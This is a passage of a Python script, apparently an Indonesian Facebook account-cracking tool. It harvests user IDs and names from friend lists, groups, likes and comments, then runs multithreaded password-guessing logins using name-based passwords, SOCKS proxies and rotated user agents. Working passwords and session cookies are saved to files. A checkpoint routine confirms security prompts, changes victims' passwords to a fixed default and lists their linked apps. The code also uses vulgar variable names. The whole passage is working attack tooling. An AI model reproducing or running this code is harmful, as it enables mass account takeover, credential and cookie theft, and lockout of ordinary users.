        titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
        for x in titik:
            sys.stdout.write('\r %s[%s!%s] Deleting Token/Cookie %s'%(N,M,N,x)); sys.stdout.flush()
            time.sleep(1)
        os.system('rm -rf .token.txt');os.system('rm -rf .cokie.txt')
        jalan('\n %s[%s✓%s] %sSuccessfully delete Token/Cookie...'%(N,H,N,H))
        jalan('\n %s[%s✓%s] Retrun SC type "%spython suwunganyar.py%s"'%(N,H,N,H,N));exit()
    else:
        jalan('\n %s[%s×%s] Sorry menu [%s%s%s] moderate improvement...!'%(N,M,N,M,pepek,N));time.sleep(2);moch_yayan()
    return __crack__().plerr(id)
###### CRACK ID RANDOM MASSAL #####
def _ngocok_(__ppk__):
    try:
        print("%s══════════════════════════════════════════\n %sTARGET INFO%s"%(N,BM,N))
        nanya_keun = int(input(f' %s[%s?%s] Enter the target amount : %s'%(N,K,N,H)))
    except:nanya_keun=1
    print(f" %s[%s•%s] type %sme%s Crack from friends list"%(N,H,N,H,N))
    for mnh in range(nanya_keun):
        mnh +=1
        try:user = input(f' %s[%s?%s] Enter ID/Uname %s%s%s : %s'%(N,K,N,H,mnh,N,H));_memek_ = __convert__(user)
        except AttributeError:print(f" {N}[{M}×{N}] Username or ID is not public");continue
        try:
            zzz = requests.get(f"https://graph.facebook.com/v2.0/{_memek_.get('_kontol_')}?fields=friends.limit(5000)&access_token={__ppk__}").json()["friends"]
            for x in zzz["data"]:
                id.append(x["id"]+"<=>"+x["name"]+"\n")
        except (KeyError,IOError):
            jalan(f' %s[%s×%s] Sorry %sFriends ID is not public%s'%(N,M,N,M,N));continue
###### CRACK ANGGOTA GRUP PUBLIK #####
def crack_grup(url_group,kueh):
    try:
        sop_dev = BeautifulSoup(requests.get(url_group, cookies=kueh).content, "html.parser")
        members = sop_dev.find("div", id="objects_container")
        for dev in members.find_all("table"):
            user_ = dev["id"].replace("member_", "")
            nama_ = re.findall('<img alt="(.*), profile picture"', str(dev))[0]
            try:id.append(f"{str(user_)}<=>{str(nama_)}\n")
            except:pass
            sys.stdout.write(f"\r {N}[{H}•{N}] Process Dump ID : {H}{len(id)}");sys.stdout.flush()
        if "Lihat Selengkapnya" in str(sop_dev):
            url = sop_dev.find("a", string="Lihat Selengkapnya")["href"]
            url_grup = "https://mbasic.facebook.com"+url
            crack_grup(url_group,kueh)
    except:pass
    #_i_.__crack__().plerr(id)
###### CRACK LIKE POSTINGAN #####
def like_post(hencet, mmk):
    try:
        kontol=requests.get(hencet,cookies=mmk).text
        if "Semua 0" in kontol:
            exit(" [!] There are no responses to this post")
        else:
            memek=re.findall('\<h3\ class\=\".."\>\<a\ href\=\"(.*?)"\>(.*?)<\/a\>',kontol)
            for softek in memek:
                if "profile.php?" in softek[0]:
                    id.append(re.findall("id=(.*)",softek[0])[0]+"<=>"+softek[1])
                else:
                    id.append(re.findall("/(.*)",softek[0])[0]+"<=>"+softek[1])
                sys.stdout.write(f"\r {N}[{H}•{N}] Process Dump ID : {H}{len(id)}");sys.stdout.flush()
            if "Lihat Selengkapnya" in kontol:
                like_post("https://mbasic.facebook.com"+BeautifulSoup(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"), mmk)
    except:pass
    #_i_.__crack__().plerr(id)
###### CRACK KOMENTAR #####
def ngomen_post(hencet, token):
    try:
        kontol= requests.get(hencet,cookies=token,headers={"user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}).text.encode("utf-8")
        memek = BeautifulSoup(kontol,'html.parser')
        for mmk in memek.find_all('h3'):
            for _id_ in mmk.find_all('a',href=True):
                if "profile.php" in _id_.get("href"):
                    xz = _id_.get("href").split('=')[1]
                    bb = xz.split('&')[0]
                    xd = _id_.text
                    id.append(bb+'<=>'+xd+'\n')
                else:
                    xz = _id_.get("href").split('?')[0]
                    bb = xz.split('/')[1]
                    xd = _id_.text
                    id.append(bb+'<=>'+xd+'\n')
                sys.stdout.write(f"\r {N}[{H}•{N}] Process Dump ID : {H}{len(id)}");sys.stdout.flush()
        for asu in memek.find_all("a",href=True):
            if "Lihat komentar lainnyaâ€¦" in asu.text:
                ngomen_post("https://mbasic.facebook.com/"+asu.get("href"), token)
    except:pass
    #_i_.__crack__().plerr(id)
# USERNAME CONVERT TO ID
def __convert__(mmk):
    if "me" in mmk:
        return {"_kontol_":mmk}
    elif(re.findall("\w+",mmk)):
        r = requests.get(f"https://mbasic.facebook.com/{mmk}?_rdr").text
        try:
            user = re.findall('\;rid\=(\d+)\&',str(r))[0]
        except:
            user = mmk
    return {"_kontol_":user}
# CHEKER AKUN CHECKPOINT
def gabut():
    dirs = os.listdir("results")
    print('%s══════════════════════════════════════════\n %sFILE RESULT CRACK%s'%(N,BM,N))
    for file in dirs:
        print(" [%s+%s] %s"%(H,N,file))
    files = input("\n %s[%s?%s] Enter file : %s"%(N,K,N,H))
    try:
        buka_baju = open(f'results/{files}','r').readlines()
    except IOError:
        print('\n [!] Sorry, the file doesnt exist');time.sleep(2);moch_yayan()
    ww=input(f"{N}══════════════════════════════════════════\n [{M}!{N}] Play airplanemode first.\n══════════════════════════════════════════\n {N}[{K}?{N}] Change password when {BM}TAP YES{N} [{H}Y{N}/{M}t{N}]: {K}")
    if ww in ("Y","y","ya"):
        ubahP.append("y")
        print(f"\n {N}[{H}•{N}] Password example : {H}admin123{N}")
        pwBar=input(f" [{K}?{N}] Enter new password : {K}")
        if len(pwBar) <= 5:
             print('\n %s[%s×%s] Password minimum 6 characters'%(N,M,N))
        else:
            pwBaru.append(pwBar)
    print(f' %s[%s•%s] Total %s%s%s account'%(N,H,N,H,str(len(buka_baju)),N))
    print("%s══════════════════════════════════════════"%(N))
    for memek in buka_baju:
        kontol = memek.replace('\n', '')
        titid  = kontol.split(' • ')
        print(f'{N}══════════════════════════════════════════\n {H}LOGIN PROCESS')
        jalan(f' {N}[{M}?{N}] Account : {K}{kontol.replace("[SUWUNG-CP] ", "")}{N}')
        try:
            log_hasil(titid[0].replace("[SUWUNG-CP] ", ""), titid[1])
        except requests.exceptions.ConnectionError:
            continue
            print("")
    print("")
    jalan(' %s[%s✓%s] %sChecking process is complete%s'%(N,H,N,H,N))
    jalan(' %s[%s✓%s] Retrun SC type "%spython suwunganyar.py%s"'%(N,H,N,H,N));exit()
# CHEKPOINT DETEDTOR
def log_hasil(user, pasw):
    global aman,cp,salah
    session=requests.Session()
    uas_cekdetekdor = "Mozilla/5.0 (Linux; Android 12; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_EN;FBAV/239.0.0.10.109;]"
    session.headers.update({"Host":"mbasic.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":bahasa,"referer":"https://mbasic.facebook.com/","user-agent":uas_cekdetekdor})
    soup=BeautifulSoup(session.get("https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
    link=soup.find("form",{"method":"post"})
    for x in soup("input"):
        data.update({x.get("name"):x.get("value")})
    data.update({"email":user,"pass":pasw})
    urlPost=session.post("https://mbasic.facebook.com"+link.get("action"),data=data)
    response=BeautifulSoup(urlPost.text, "html.parser")
    if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(urlPost.text)):
        sys.stdout.write('\r %s[%s!%s] Turn on airplanemode 2 seconds'%(N,M,N)),
    if "c_user" in session.cookies.get_dict():
        if "Akun Anda Dikunci" in urlPost.text:
            print(f"\r {N}[{M}×{N}] Account locked")
        else:
            coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
            open('results/OKE.txt', 'a').write(f"[✓] {user} • {pasw}\n")
            jalan(f"\r {N}[{H}✓{N}] {H}Account unlocked{N}");time.sleep(0.03)
            cek_apk(session,coki)
    elif "checkpoint" in session.cookies.get_dict():
        title=re.findall("\<title>(.*?)<\/title>",str(response))
        link2=response.find("form",{"method":"post"})
        listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
        for x in response("input"):
            if x.get("name") in listInput:
                data2.update({x.get("name"):x.get("value")})
        an=session.post(url_mb+link2.get("action"),data=data2)
        response2=BeautifulSoup(an.text,"html.parser")
        number=0
        cek=[cek.text for cek in response2.find_all("option")]
        if(len(cek)==0):
            if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
                if "y" in ubahP:
                    mmk = pwBaru
                    jalan(f"\r [{H}•{N}] Status : {BM}{P}TAP YES{N}");time.sleep(0.03)
                    ubah_pw(session,response,link2,user, mmk)
                else:
                    mmk = "adminroy123"
                    jalan(f"\r [{H}•{N}] Status : {BM}{P}TAP YES{N}");time.sleep(0.03)
                    ubah_pw(session,response,link2,user, mmk)
            elif "Masukan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
                print(' [%s!%s] Sorry, the account is installed A2F'%(M,N))
            else:
                open('results/ERROR.txt', 'a').write(f"[SUWUNG-CP] {user} • {pasw}\n")
                print(f" {N}[{M}!{N}] Error")
        else:
            open(f'results/CP-DETEKTOR-{ha}-{op}-{ta}.txt', 'a').write(f"[SUWUNG-CP] {user} • {pasw}\n")
            print(" %s[%s•%s] There are %s options "%(N,H,N,len(cek)))
        for opt in range(len(cek)):
            print(f" [\x1b[1;92m{str(opt+1)}\x1b[0m] "+cek[opt])
    else:
        print(f"\r {N}[{M}!{N}] Password is wrong or has been changed")
        open('results/INVALID-OK.txt', 'a').write(f"[SUWUNG-CP] {user} • {pasw}\n")
#UBAH PW
def ubah_pw(session,response,link2,user,mmk):
    dat,dat2={},{}
    but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
    for x in response("input"):
        if x.get("name") in but:
            dat.update({x.get("name"):x.get("value")})
    ubahPw=session.post(url_mb+link2.get("action"),data=dat).text
    resUbah=BeautifulSoup(ubahPw,"html.parser")
    link3=resUbah.find("form",{"method":"post"})
    but2=["submit[Next]","nh","fb_dtsg","jazoest"]
    if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
        for b in resUbah("input"):
            if b.get("name") in but2:
                dat2.update({b.get("name"):b.get("value")})
        dat2.update({"password_new":"".join(mmk)})
        an=session.post(url_mb+link3.get("action"),data=dat2)
        coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
        print(f"\r {N}[{H}TAP-YES{N}] {H}{user} • {''.join(mmk)}{N}")
        print(f"\r {A}Cookie : {coki}{N}")
        open('results/TAB-YES.txt', 'a').write(f"[TAP-YES] {user} • {''.join(mmk)}\n")
        cek_apk(session,coki)
# CEK APLIKASI YANG TERKAIT
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %sSorry there is no Active Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r 🎮  %sYour Active Application Details :'%(H))
        for i in range(len(game)):
            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %sSorry no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r 🎮  %sYour Expired Application Details :'%(M))
        for i in range(len(game)):
            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print(f'\r')
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie\n'%(N,M,N))
# MULAI CRACK
class __crack__:

    def __init__(self):
        self.id = []
    # ------- NAMPILKAN APLIKASI --------
    def tampilkan_apk(self):
        print("%s════════════════════════════════════════\n [%s!%s] Displaying the application, the account will be easily hit by checkpoints due to using excessive request modules. It is not recommended to display the application"%(N,M,N))
        #crot = input(f" {N}[{K}?{N}] Klik Enter Untuk Lanjut : {H}")
        crot = input(f" {N}[{K}?{N}] Want to show related apps [{H}y{N}/{M}t{N}]: ")
        if crot in[""]:
            print(f" {N}[{M}×{N}] Don't be empty");self.tampilkan_apk()
        elif crot in["Y","y"]:
            Apk.append("y")
        elif crot in["T","t"]:
            Apk.append("t")
        else:
            #jalan(f" {N}[{M}×{N}] Sorry, wrong username");self.tampilkan_apk()
            print(f" {N}[{M}×{N}] Choose between y/t");self.tampilkan_apk()
# METODE SANDI MANUAL
    def plerr(self,id):
        self.id = id
        print(f'\n %s[%s•%s] Total ID : %s%s%s' %(N,H,N,H,len(self.id),N))
        ___yayanganteng___ = input('%s══════════════════════════════════════════\n [%s?%s] klik Enter untuk lanjut (%srequired%s) : %s'%(N,K,N,H,N,H))
        if ___yayanganteng___ in ('raraY', 'raray'):
            self.tampilkan_apk()
            print('%s══════════════════════════════════════════\n %sMANUAL PASSWORD DETAILS%s'%(N,BM,N))
            print(' %s[%s!%s] Use %sKOMMA%s for separator\n [%s•%s] Example : %sroy123%s,%ssayang%s,%sbismillah'%(N,M,N,H,N,H,N,H,N,H,N,H))
            while True:
                pwek = input(' %s[%s?%s] Enter password : %s'%(N,K,N,H))
                print(' %s[%s•%s] Active Password : %s%s%s' % (N,H,N,H, pwek, N))
                if pwek == '':
                    print('\n %s[%s×%s] Sorry, it is wrong...!'%(N,M,N))
                elif len(pwek)<=5:
                    print('\n %s[%s×%s] Password minimum 6 characters'%(N,M,N))
                else:
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        cin = input('\n %s[%s?%s] Choose method : '%(N,K,N))
                        if cin == '':
                            print('\n %s[%s×%s] Sorry, it is wrong...!'%(N,M,N));__yan__()
                        elif cin == '1':
                            print('%s══════════════════════════════════════════\n [%s+%s] OK : results/OK-%s-%s-%s.txt'%(N,H,N,ha, op, ta))
                            print(' %s[%s+%s] CP : results/CP-%s-%s-%s.txt'%(N,K,N,ha, op, ta))
                            print('%s══════════════════════════════════════════\n [%s!%s] Must activate airplanemode on ID 30\n [%s!%s] Play back airplanemode every 500 ID\n [%s!%s] To stop %sCTRL+c%s on keyboard\n══════════════════════════════════════════'%(N,M,N,M,N,M,N,H,N))
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__metode__, kimochi, ysc, "free.facebook.com")
                                    except: pass

                            hasil(ok,cp)
                        elif cin == '2':
                            print('%s══════════════════════════════════════════\n [%s+%s] OK : results/OK-%s-%s-%s.txt'%(N,H,N,ha, op, ta))
                            print(' %s[%s+%s] CP : results/CP-%s-%s-%s.txt'%(N,K,N,ha, op, ta))
                            print('%s══════════════════════════════════════════\n [%s!%s] Must activate airplanemode on ID 30\n [%s!%s] Play back airplanemode every 500 ID\n [%s!%s] To stop %sCTRL+c%s on keyboard\n══════════════════════════════════════════'%(N,M,N,M,N,M,N,H,N))
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__metode__, kimochi, ysc, "mbasic.facebook.com")
                                    except: pass

                            hasil(ok,cp)
                        elif cin == '3':
                            print('%s══════════════════════════════════════════\n [%s+%s] OK : results/OK-%s-%s-%s.txt'%(N,H,N,ha, op, ta))
                            print(' %s[%s+%s] CP : results/CP-%s-%s-%s.txt'%(N,K,N,ha, op, ta))
                            print('%s══════════════════════════════════════════\n [%s!%s] Must activate airplanemode on ID 30\n [%s!%s] Play back airplanemode every 500 ID\n [%s!%s] To stop %sCTRL+c%s on keyboard\n══════════════════════════════════════════'%(N,M,N,M,N,M,N,H,N))
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__metode__, kimochi, ysc, "mbasic.facebook.com")
                                    except: pass

                            hasil(ok,cp)
                        else:
                            print(' [%s×%s] Sorry, it is wrong...!'%(N,M,N));__yan__()
                    mentod()
                    __yan__(pwek.split(','))
                    break
        elif ___yayanganteng___ in ('bgs'):
            self.tampilkan_apk()
            mentod()
            self.__pler__()
        else:
            jalan(' %s[%s×%s] Sorry, wrong SC Password'%(N,M,N));self.plerr(id)
            #print('\n %s[%s×%s] Sorry, it is wrong...!'%(N,M,N));self.plerr(id)
# PROSES CRACK METODE 3 in 1
    def __metode__(self, cebok, user, pasw):
        global ok,cp,loop
        animasi = random.choice(["\x1b[1;97m[?]"])
        sys.stdout.write(f"\r {N}{animasi} {N}{loop}{N}/{M}{len(self.id)} {N}[{H}OK:{len(ok)}{N}][{K}CP:{len(cp)}{N}] [{H}{'{:.1%}'.format(loop/float(len(self.id)))}{N}]")
        sys.stdout.flush()
        try:os.mkdir('results')
        except:pass
        try:
            for pw in pasw:
                pw = pw.lower()
                session=requests.Session()
                nip=random.choice(prox)
                proxs= {'http': 'socks4://'+nip}
                #ua1 = random.choice(agen1)
                #ua2 = random.choice(agen2)
                ua = random.choice(ugen)
                ua2 = random.choice(ugen2)
                session.headers.update({'Host': cebok,'cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                p = session.get('https://'+cebok+'/login/device-based/password/?uid='+user+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
                dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":user,"next":"https://"+cebok+"/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
                koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
                koki+=' m_pixel_ratio=2.625; wd=412x756'
                heade={'Host': cebok,'cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://'+cebok,'content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://'+cebok+'/login/device-based/password/?uid='+user+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
                po = session.post('https://'+cebok+'/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
                if "c_user" in session.cookies.get_dict():
                    cooz = session.cookies.get_dict()
                    coki = 'datr=' + cooz['datr'] + ';' + ('c_user=' + cooz['c_user']) + ';' + ('fr=' + cooz['fr']) + ';' + ('xs=' + cooz['xs'])
                    if "t" in Apk:
                        tree = Tree("")
                        tree.add(f"{H}User : {user} Pw : {pw}").add(f"{coki}{N}\n")
                        prints(tree)
                    elif "y" in Apk:
                        tree = Tree("")
                        tree.add(f"{H}User : {user} Pw : {pw}").add(f"{coki}{N}\n")
                        prints(tree)
                    wrt = '[SUWUNG-OK] %s • %s' % (user,pw)
                    ok.append(wrt)
                    cek_apk(session,coki)
                    open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    tree = Tree("")
                    tree.add(f"{K}User : {user} Pw : {pw}{N}\n")
                    prints(tree)
                    wrt = '[SUWUNG-CP] %s • %s' % (user,pw)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
                #time.sleep(31)
            loop+=1
        except requests.exceptions.ConnectionError:
            self.__metode__(cebok, user, pasw)


    def __pler__(self):
        yan = input('\n %s[%s?%s] Choose Method : '%(N,K,N))
        if yan == '':
            print('\n %s[%s×%s] Sorry, it is wrong...!'%(N,M,N));self.__pler__()
        elif yan in ('1', '01'):
            xx = "free.facebook.com"
            self.kombinasi_pw(xx)
        elif yan in ('2', '02'):
            xx = "mbasic.facebook.com"
            self.kombinasi_pw(xx)
        elif yan in ('3', '03'):
            xx = "m.facebook.com"
            self.kombinasi_pw(xx)
        else:
            print('\n %s[%s×%s] Sorry, it is wrong...!'%(N,M,N));self.__pler__()

    def kombinasi_pw(self,url):
        print('%s════════════════════════════════════════\n %sPASSWORD MENU%s'%(N,BM,N))
        print(' %s[%s1%s] nama,nama123,nama12345'%(N,H,N))
        print(' %s[%s2%s] nama,nama123,nama1234,nama12345'%(N,H,N))
        print(' %s[%s3%s] nama,nama123,nama1234,nama12345,%s+Sandi%s'%(N,H,N,H,N))
        pw = input(f"\n {N}[{K}?{N}] Choose Password Method : ")
        if pw in[""]:
            print(f" {N}[{M}!{N}] Don't be empty");self.kombinasi_pw(url)
        elif pw in["1","01"]:
            print('%s════════════════════════════════════════\n [%s+%s] OK : results/OK-%s-%s-%s.txt'%(N,H,N,ha, op, ta))
            print(' %s[%s+%s] CP : results/CP-%s-%s-%s.txt'%(N,K,N,ha, op, ta))
            print('%s══════════════════════════════════════════\n [%s!%s] Must activate airplanemode on ID 30\n [%s!%s] Play back airplanemode every 500 ID\n [%s!%s] To stop %sCTRL+c%s on keyboard\n══════════════════════════════════════════'%(N,M,N,M,N,M,N,H,N))
            with YayanGanteng(max_workers=35) as kirim:
                for yntkts in self.id:
                   try:
                       uid, name = yntkts.split('<=>')
                       xz = name.split(' ')
                       if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                           pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345"]
                       else:
                           pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"12345"]
                       kirim.submit(self.__metode__,url,uid,pwx)
                   except:pass
            hasil(ok,cp)
        elif pw in["2","02"]:
            print('%s════════════════════════════════════════\n [%s+%s] OK : results/OK-%s-%s-%s.txt'%(N,H,N,ha, op, ta))
            print(' %s[%s+%s] CP : results/CP-%s-%s-%s.txt'%(N,K,N,ha, op, ta))
            print('%s══════════════════════════════════════════\n [%s!%s] Must activate airplanemode on ID 30\n [%s!%s] Play back airplanemode every 500 ID\n [%s!%s] To stop %sCTRL+c%s on keyboard\n══════════════════════════════════════════'%(N,M,N,M,N,M,N,H,N))
            with YayanGanteng(max_workers=35) as kirim:
                for yntkts in self.id:
                   try:
                       uid, name = yntkts.split('<=>')
                       xz = name.split(' ')
                       if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                           pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+xz[1]]
                       else:
                           pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+xz[1]]
                       kirim.submit(self.__metode__,url,uid,pwx)
                   except:pass
            hasil(ok,cp)
        elif pw in["3","03"]:
            print('%s════════════════════════════════════════\n %sADDITIONAL PASSWORD MENU%s'%(N,BM,N))
            #print(" %s[%s!%s] Semakin banyak kombinasi password semakin lama proses crack!"%(N,M,N))
            print(" %s[%s!%s] Use %sKOMMA%s for separator"%(N,M,N,H,N))
            print(" %s[%s!%s] Example : %ssayang,rahasia,bismillah%s"%(N,M,N,H,N))
            pw = input(f" {N}[{K}?{N}] Enter additional password : {H}").split(",")
            print('%s════════════════════════════════════════\n [%s+%s] OK : results/OK-%s-%s-%s.txt'%(N,H,N,ha, op, ta))
            print(' %s[%s+%s] CP : results/CP-%s-%s-%s.txt'%(N,K,N,ha, op, ta))
            print('%s══════════════════════════════════════════\n [%s!%s] Must activate airplanemode on ID 30\n [%s!%s] Play back airplanemode every 500 ID\n [%s!%s] To stop %sCTRL+c%s on keyboard\n══════════════════════════════════════════'%(N,M,N,M,N,M,N,H,N))
            with YayanGanteng(max_workers=35) as kirim:
                for yntkts in self.id:
                   try:
                       uid, name = yntkts.split('<=>')
                       xz = name.split(' ')
                       if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                           xxx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1]]
                           pwx = xxx + pw
                       else:
                           xxx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1]]
                           pwx = xxx + pw
                       kirim.submit(self.__metode__,url,uid,pwx)
                   except:pass
            hasil(ok,cp)
        else:
            print(f"\n {N}[{M}!{N}] Correct input");self.kombinasi_pw(url)

if __name__ == '__main__':
    login()
    #cek_pw()